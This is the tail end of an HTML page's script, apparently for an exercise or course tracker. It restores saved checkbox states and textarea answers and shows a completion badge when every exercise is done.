                });
            }
            if (data.checkboxes) {
                Object.entries(data.checkboxes).forEach(([id, checked]) => {
                    const cb = document.getElementById(id);
                    if (cb) { cb.checked = checked; if (checked) cb.closest('.task-item').classList.add('checked'); }
                });
            }
            if (data.answers) {
                Object.entries(data.answers).forEach(([id, value]) => {
                    const ta = document.getElementById(id);
                    if (ta) ta.value = value;
                });
            }
            if (completedExercises.size === TOTAL_EXERCISES) document.getElementById('completionBadge').classList.add('show');
        }
    </script>
</body>
</html>
